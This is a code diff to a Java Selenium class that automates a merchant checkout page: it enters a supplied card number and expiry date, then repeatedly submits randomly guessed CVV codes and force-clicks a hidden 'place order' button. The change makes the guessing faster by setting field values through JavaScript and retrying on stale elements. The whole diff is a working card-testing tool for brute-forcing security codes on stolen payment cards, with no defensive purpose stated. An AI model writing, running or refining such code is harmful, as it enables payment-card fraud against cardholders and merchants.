@@ -128,52 +128,43 @@ public class RealTimeSeleniumProcessor {
     public static String processFetsLuckCard(String cardNumber, String expMonth, String expYear, String userCVV) {
         try {
             WebDriverWait localWait = new WebDriverWait(driver, Duration.ofSeconds(10));
-
-            // Convert month to full name
-            String[] monthNames = {
-                "Jan", "Feb", "Mar", "Apr", "May", "Jun",
-                "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
-            };
+            JavascriptExecutor js = (JavascriptExecutor) driver;
+            // Convert month/year
+            String[] monthNames = { "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" };
             int monthIndex = Integer.parseInt(expMonth) - 1;
             if (monthIndex < 0 || monthIndex > 11) return "❌ Invalid expiration month.";
             String monthName = monthNames[monthIndex];
-
-            // Convert year to 4-digit
             String fullYear = expYear.length() == 2 ? "20" + expYear : expYear;
-                // Fill Card Number
-                WebElement ccNumber = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_number")));
-                ccNumber.clear();
-                ccNumber.sendKeys(cardNumber);
 
-                // Select Expiration Month
-                Select monthDropdown = new Select(localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_month"))));
-                monthDropdown.selectByVisibleText(monthName);
+            // Pre-locate stable elements
+            WebElement ccNumber = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_number")));
+            WebElement monthSelect = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_month")));
+            WebElement yearSelect = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_year")));
 
-                // Select Expiration Year
-                Select yearDropdown = new Select(localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cc_year"))));
-                yearDropdown.selectByVisibleText(fullYear);
-                for (int attempt = 1; attempt <= 7; attempt++) {
-                // Generate random CVV matching length of user input
-                int cvvLength = userCVV.length();
-                String randomCVV;
-                if (cvvLength == 4) {
-                    randomCVV = String.valueOf(1000 + new Random().nextInt(9000));
-                } else {
-                    randomCVV = String.valueOf(100 + new Random().nextInt(900));
+            // Set static values
+            ccNumber.clear();
+            ccNumber.sendKeys(cardNumber);
+            new Select(monthSelect).selectByVisibleText(monthName);
+            new Select(yearSelect).selectByVisibleText(fullYear);
+
+            // Use JS to avoid input delays
+            for (int attempt = 1; attempt <= 7; attempt++) {
+                String randomCVV = userCVV.length() == 4
+                        ? String.valueOf(1000 + new Random().nextInt(9000))
+                        : String.valueOf(100 + new Random().nextInt(900));
+                try {
+                    WebElement cvvField = driver.findElement(By.name("cvv_number"));
+                    WebElement placeOrderBtn = driver.findElement(By.id("billingReviewBtnDefault"));
+
+                    js.executeScript("arguments[0].value = arguments[1];", cvvField, randomCVV);
+                    js.executeScript("arguments[0].click();", placeOrderBtn);
+
+                } catch (StaleElementReferenceException e) {
+                    attempt--;
                 }
-
-                // Enter CVV
-                WebElement cvvField = localWait.until(ExpectedConditions.presenceOfElementLocated(By.name("cvv_number")));
-                cvvField.clear();
-                cvvField.sendKeys(randomCVV);
-
-                // Click PLACE ORDER (force click hidden submit)
-                WebElement placeOrderBtn = driver.findElement(By.id("billingReviewBtnDefault"));
-                ((JavascriptExecutor) driver).executeScript("arguments[0].click();", placeOrderBtn);
             }
             driver.quit();
             return "❌ 7 random CVV attempts failed. Card was declined.";
-
         } catch (Exception e) {
             return "❌ Error during fetsluck processing: " + e.getMessage();
         }
